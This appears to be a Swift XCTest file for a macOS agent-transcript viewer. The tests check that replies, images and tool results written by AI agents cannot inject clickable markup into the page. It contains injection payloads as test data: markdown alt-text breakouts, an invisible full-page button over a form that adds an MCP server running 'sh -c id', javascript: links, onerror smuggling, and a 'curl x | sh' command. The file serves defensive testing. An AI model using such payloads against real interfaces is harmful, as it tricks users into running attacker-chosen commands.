import WebKit
import XCTest
@testable import omux
@testable import OmuxCore

/// The transcript page draws text that agents, tools and other machines wrote. None of it may
/// become markup. The page's clicks act for the user: a form of class info-form adds an MCP
/// server, which is a command that runs, and an element with data-manage types a command into
/// the session. Markup that reached the page could carry those and cover the page with a
/// style, so that the next click anywhere did it. The page is loaded here as the app loads it.
@MainActor
final class TranscriptPageTests: XCTestCase {
    private final class Page: NSObject, WKScriptMessageHandler, WKNavigationDelegate {
        let view = WKWebView(frame: NSRect(x: 0, y: 0, width: 800, height: 600), configuration: WKWebViewConfiguration())
        /// What the page asked the app for, the first drawing's "rendered" aside.
        var messages: [[String: Any]] = []
        var loaded: (() -> Void)?

        override init() {
            super.init()
            view.configuration.userContentController.add(self, name: "omux")
            view.navigationDelegate = self
        }

        func userContentController(_ controller: WKUserContentController, didReceive message: WKScriptMessage) {
            if let body = message.body as? [String: Any], body["type"] as? String != "rendered" { messages.append(body) }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { loaded?() }

        /// Runs `script`, which must end in a string, and returns that string.
        func run(_ script: String) async -> String {
            await withCheckedContinuation { continuation in
                view.evaluateJavaScript(script) { result, error in
                    continuation.resume(returning: result as? String ?? "failed: \(String(describing: error))")
                }
            }
        }

        func render(_ body: String) async {
            let drawn = await run("omux.setTheme({cards: true}); omux.render(\(body)); 'drawn'")
            XCTAssertEqual(drawn, "drawn")
        }

        /// How many elements of the conversation match `selector`.
        func count(_ selector: String) async -> Int {
            let selector = String(decoding: try! JSONEncoder().encode(selector), as: UTF8.self)
            return Int(await run("String(document.querySelectorAll(\(selector)).length)")) ?? -1
        }
    }

    /// The page from the sources; skipped where WebKit can't bring it up.
    private func loadPage() async throws -> Page {
        let folder = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Resources/transcript", isDirectory: true)
        let page = Page()
        let loaded = XCTestExpectation(description: "the page loads")
        page.loaded = { loaded.fulfill() }
        page.view.loadFileURL(folder.appendingPathComponent("transcript.html"), allowingReadAccessTo: folder)
        guard await XCTWaiter().fulfillment(of: [loaded], timeout: 20) == .completed else { throw XCTSkip("WebKit didn't load the page here") }
        return page
    }

    private func object(_ json: String) -> [String: Any] {
        try! JSONSerialization.jsonObject(with: Data(json.utf8)) as! [String: Any]
    }

    /// What the app hands `omux.render`, around the blocks.
    private func body(blocks: String, status: String = "null") -> String {
        "{\"blocks\":\(blocks),\"session\":\"\(UUID().uuidString)\",\"name\":\"t\",\"truncated\":false,\"agents\":[],\"git\":false,\"status\":\(status)}"
    }

    private func body(of blocks: [ChatBlock]) throws -> String {
        let encoded = try blocks.map { String(decoding: try JSONEncoder().encode($0), as: UTF8.self) }.joined(separator: ",")
        return body(blocks: "{\"full\":true,\"total\":\(blocks.count),\"blocks\":[\(encoded)]}")
    }

    /// Everything on the page that acts on a click, or could be made to cover it.
    private static let acting = "#list form, #list [data-manage], #list [data-form], #list [data-info], #list [data-action], "
        + "#list [data-info-action], #list [data-open-path], #list [data-act=resend], #list [data-act=quote], #list [id], "
        + "#list .assistant .body [style], #list .thinking .body [style], #list .status .live [style], #list script, #list iframe"

    /// A form that would add a server, with a button stretched over the whole page.
    private static let form = #"<div data-info="0"><form class="info-form" data-form="mcp-add"><input type="hidden" name="name" value="helper">"#
        + #"<input type="hidden" name="transport" value="stdio"><input type="hidden" name="target" value="sh -c id">"#
        + #"<button id="everywhere" type="submit" style="position:fixed;inset:0;width:100vw;height:100vh;opacity:0;z-index:2147483647"></button></form></div>"#

    /// marked gives an image's alt text to the page as it was written. A quote in it ended the
    /// attribute, so a reply could write any element: this one covered the page with a button
    /// that added an MCP server, a command of the writer's choosing, at the next click.
    func testAReplyCannotWriteMarkup() async throws {
        let page = try await loadPage()
        let replies = [
            "Here is the diagram:\n\n![x\">\(Self.form)<i a=\"](http://a.invalid/b.png)",
            "![x\" data-manage=\"/logout\" style=\"position:fixed;inset:0](http://a.invalid/b.png)",
            "![x](http://a.invalid/b.png \"t\\\" data-manage=\\\"/logout\")",
            Self.form,
            "text <b data-manage=\"/logout\" onclick=\"x\">inline</b> html",
            "[x](javascript:alert(1)) and [y\" data-manage=\"/logout](http://a.invalid)",
            "```js\" data-manage=\"/logout\ncode\n```",
        ]
        var blocks = replies.enumerated().map { ChatBlock(id: $0.offset, kind: .assistant, text: $0.element) }
        blocks.append(ChatBlock(id: blocks.count, kind: .thinking, text: replies[0]))
        // The reply as it is read off the screen while the agent writes it goes the same way.
        let live = String(decoding: try JSONEncoder().encode(replies[0]), as: UTF8.self)
        let encoded = try blocks.map { String(decoding: try JSONEncoder().encode($0), as: UTF8.self) }.joined(separator: ",")
        await page.render(body(blocks: "{\"full\":true,\"total\":\(blocks.count),\"blocks\":[\(encoded)]}", status: "{\"state\":\"working\",\"live\":\(live)}"))
        // A click in the middle of the page, where the button was, asks the app for nothing.
        _ = await page.run("document.elementFromPoint(400, 300).click(); 'clicked'")
        try await Task.sleep(for: .milliseconds(200))
        XCTAssertEqual(page.messages.compactMap { $0["type"] as? String }.filter { ["config", "manage", "send"].contains($0) }, [])

        _ = await page.run("document.querySelectorAll('.thinking .head').forEach(h => h.click()); 'opened'")
        let acting = await page.count(Self.acting)
        XCTAssertEqual(acting, 0, "a reply put something that acts on the page")
        let handlers = await page.run("String(Array.from(document.querySelectorAll('#list *')).filter(e => e.getAttributeNames().some(a => /^on/i.test(a))).length)")
        XCTAssertEqual(handlers, "0")
        let scripted = await page.count("#list a[href^=javascript]")
        XCTAssertEqual(scripted, 0)
        // What was written is still there to read, as text.
        let text = await page.run("document.querySelector('#list').textContent")
        XCTAssertTrue(text.contains("data-manage"), "the markup shows as what it is")
    }

    /// The same check must not cost a reply its own markup: emphasis, links, code with its
    /// colours and its Copy button, tables and task lists are what marked writes.
    func testAReplyKeepsItsMarkdown() async throws {
        let page = try await loadPage()
        let reply = """
        **bold**, `code` and [a link](https://example.com "to there").

        ```swift
        let x = "one"
        ```

        | a | b |
        |---|:-:|
        | 1 | 2 |

        - [x] done
        - [ ] not yet

        1. first
        """
        await page.render(try body(of: [ChatBlock(id: 0, kind: .assistant, text: reply)]))
        for (selector, expected) in [("strong", 1), ("a[href='https://example.com'][title='to there']", 1), ("pre > button.copy[type=button]", 1),
                                     ("pre > code.hljs.language-swift", 1), ("td[align=center]", 1), ("input[type=checkbox][disabled]", 2),
                                     ("input[type=checkbox][checked]", 1), ("ol > li", 1)] {
            let found = await page.count("#list .assistant .body " + selector)
            XCTAssertEqual(found, expected, selector)
        }
        let coloured = await page.count("#list pre code span[class^=hljs-]")
        XCTAssertGreaterThan(coloured, 0, "highlight.js still colours the code")
        // And Copy still copies the code.
        _ = await page.run("document.querySelector('#list pre > button.copy').click(); 'clicked'")
        try await Task.sleep(for: .milliseconds(200))
        XCTAssertEqual(page.messages.first?["type"] as? String, "copy")
        XCTAssertEqual(page.messages.first?["text"] as? String, "let x = \"one\"")
    }

    /// An image block's type and bytes went into an attribute of the page as they were written
    /// in the record: a tool's result, or a transcript copied from another machine, wrote the
    /// markup of its choice. Now a block is a picture or it is nothing, in the reader and on the page.
    func testAPictureIsOnlyEverAPicture() async throws {
        let pixel = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
        func image(type: Any?, data: Any?) -> [String: Any] {
            var source: [String: Any] = ["type": "base64"]
            if let type { source["media_type"] = type }
            if let data { source["data"] = data }
            return ["type": "image", "source": source]
        }
        XCTAssertEqual(TranscriptParser.dataURL(of: image(type: "image/png", data: pixel)), "data:image/png;base64," + pixel)
        XCTAssertEqual(TranscriptParser.dataURL(of: image(type: nil, data: pixel)), "data:image/png;base64," + pixel)
        XCTAssertNotNil(TranscriptParser.dataURL(of: image(type: "image/jpeg", data: "AAAA")))
        for (type, data) in [("image/png", "x\">\(Self.form)<img src=\"x"), ("image/png\" onerror=\"x", pixel), ("text/html", pixel),
                             ("image/svg+xml", pixel), ("image/png", "AA AA"), ("image/png", "")] as [(String, String)] {
            XCTAssertNil(TranscriptParser.dataURL(of: image(type: type, data: data)), "\(type) \(data.prefix(20))")
        }

        // Read from a record, as a prompt's picture and as a tool's.
        let model = SessionTranscript(tab: TabItem(name: "t"), provider: .claude, claudeFile: { nil }, codexThread: { nil })
        let bad = String(decoding: try JSONEncoder().encode("x\">\(Self.form)<img src=\"x"), as: UTF8.self)
        model.ingest([
            object(#"{"type":"user","timestamp":"2026-11-04T10:00:00.000Z","message":{"role":"user","content":[{"type":"text","text":"look"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":\#(bad)}},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"\#(pixel)"}}]}}"#),
            object(#"{"type":"assistant","timestamp":"2026-11-04T10:00:01.000Z","message":{"id":"m1","model":"claude-x","content":[{"type":"tool_use","id":"t1","name":"mcp__x__shot","input":{}}]}}"#),
            object(#"{"type":"user","timestamp":"2026-11-04T10:00:02.000Z","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"t1","is_error":true,"content":[{"type":"text","text":"failed"},{"type":"image","source":{"type":"base64","media_type":"image/png\" onerror=\"x","data":"AAAA"}}]}]}}"#),
        ])
        XCTAssertEqual(model.blocks.first?.images, ["data:image/png;base64," + pixel])
        XCTAssertEqual(model.blocks.last?.tools.first?.images, [])

        // And the page, handed such strings all the same, draws none of them.
        let page = try await loadPage()
        let injected = "data:image/png;base64,x\">\(Self.form)<img src=\"data:image/png;base64,x"
        var row = ToolRow(id: "t1", name: "Shot", detail: "", result: "failed", output: "failed", isError: true)
        row.images = ["data:image/png\" onerror=\"x;base64,AAAA", injected]
        await page.render(try body(of: [
            ChatBlock(id: 0, kind: .user, text: "look", images: [injected, "data:image/png;base64," + pixel, "https://a.invalid/b.png", "data:text/html;base64,AAAA"]),
            ChatBlock(id: 1, kind: .tools, text: "", tools: [row], claude: true),
        ]))
        let acting = await page.count("#list form, #list [data-info], #list [id], #list [onerror]")
        XCTAssertEqual(acting, 0)
        let pictures = await page.count("#list img")
        XCTAssertEqual(pictures, 1, "the one real picture")
        let thumbnails = await page.count("#list .user img.thumb[alt='pasted image']")
        XCTAssertEqual(thumbnails, 1)
    }

    /// The page asks, and the app decides from what it put there: an action is taken for an
    /// overview omux drew, through the form or the row's button that overview has. A message
    /// naming a block that is no overview, or a server the overview doesn't list, is nobody's click.
    func testThePageCanOnlyAskForWhatAnOverviewOffers() {
        let servers = AgentConfig.Overview(title: "MCP servers", summary: "", rows: [
            .init(name: "docs", detail: "http https://docs.example", note: "user", state: "ask", actions: ["login", "remove"], arg: "user"),
            .init(name: "claude.ai Mail", detail: "https://mail.example", note: "claude.ai", state: "ask", actions: ["login"]),
        ], command: "/mcp", form: "mcp", kind: "mcp")
        XCTAssertTrue(TranscriptPanel.offers(servers, action: "mcp-add", message: [:]))
        XCTAssertTrue(TranscriptPanel.offers(servers, action: "mcp-remove", message: ["name": "docs", "arg": "user"]))
        XCTAssertTrue(TranscriptPanel.offers(servers, action: "mcp-login", message: ["name": "claude.ai Mail", "arg": ""]))
        XCTAssertFalse(TranscriptPanel.offers(servers, action: "mcp-remove", message: ["name": "claude.ai Mail", "arg": ""]), "that row has no Remove")
        XCTAssertFalse(TranscriptPanel.offers(servers, action: "mcp-remove", message: ["name": "docs", "arg": "project"]), "another scope's server")
        XCTAssertFalse(TranscriptPanel.offers(servers, action: "mcp-logout", message: ["name": "other", "arg": "user"]))
        XCTAssertFalse(TranscriptPanel.offers(servers, action: "perm-add", message: [:]), "the servers' overview has no rule form")
        XCTAssertFalse(TranscriptPanel.offers(servers, action: "mcp-import", message: [:]))

        let rules = AgentConfig.Overview(title: "Permissions", summary: "", rows: [
            .init(name: "allow", detail: "Bash(npm test:*)", note: "user", state: "on", actions: ["remove"], arg: "/Users/me/.claude/settings.json"),
        ], command: "/permissions", form: "permission", kind: "permissions")
        XCTAssertTrue(TranscriptPanel.offers(rules, action: "perm-add", message: [:]))
        XCTAssertTrue(TranscriptPanel.offers(rules, action: "perm-remove", message: ["kind": "allow", "rule": "Bash(npm test:*)", "arg": "/Users/me/.claude/settings.json"]))
        XCTAssertFalse(TranscriptPanel.offers(rules, action: "perm-remove", message: ["kind": "deny", "rule": "Bash(npm test:*)", "arg": "/Users/me/.claude/settings.json"]))
        XCTAssertFalse(TranscriptPanel.offers(rules, action: "mcp-add", message: [:]))

        let plugins = AgentConfig.Overview(title: "Plugins", summary: "", rows: [
            .init(name: "tools", detail: "market", note: "1.0 · user", state: "on", actions: ["disable", "uninstall"], arg: "tools@market|user"),
        ], command: "/plugins", kind: "plugins")
        XCTAssertTrue(TranscriptPanel.offers(plugins, action: "plugin-disable", message: ["name": "tools", "arg": "tools@market|user"]))
        XCTAssertFalse(TranscriptPanel.offers(plugins, action: "plugin-enable", message: ["name": "tools", "arg": "tools@market|user"]), "it is enabled: there is no Enable")
        XCTAssertFalse(TranscriptPanel.offers(plugins, action: "mcp-add", message: [:]))

        let machines = AgentConfig.Overview(title: "Machines", summary: "", rows: [], command: "", kind: "machines", actionID: "machines-open", actionLabel: "Open Machines…")
        XCTAssertTrue(TranscriptPanel.offers(machines, action: "machines-open", message: [:]))
        XCTAssertFalse(TranscriptPanel.offers(machines, action: "mcp-import", message: [:]))
    }

    /// Adding a server is confirmed in the app's own window, with the command as it will run.
    func testAddingAServerIsAskedWithTheCommandInFull() {
        let run = TranscriptPanel.addServerQuestion(name: "helper", transport: "stdio", target: "sh -c 'curl x | sh'", scope: "user", agent: "Claude Code")
        XCTAssertTrue(run.title.contains("helper"))
        XCTAssertTrue(run.detail.contains("sh -c 'curl x | sh'"))
        XCTAssertTrue(run.detail.contains("run this command"))
        XCTAssertTrue(run.detail.contains("all your projects"))
        let remote = TranscriptPanel.addServerQuestion(name: "docs", transport: "http", target: "https://docs.example/mcp", scope: "project", agent: "Codex")
        XCTAssertTrue(remote.detail.contains("https://docs.example/mcp"))
        XCTAssertTrue(remote.detail.contains("Codex will connect"))
        XCTAssertTrue(remote.detail.contains(".mcp.json"))
    }
}
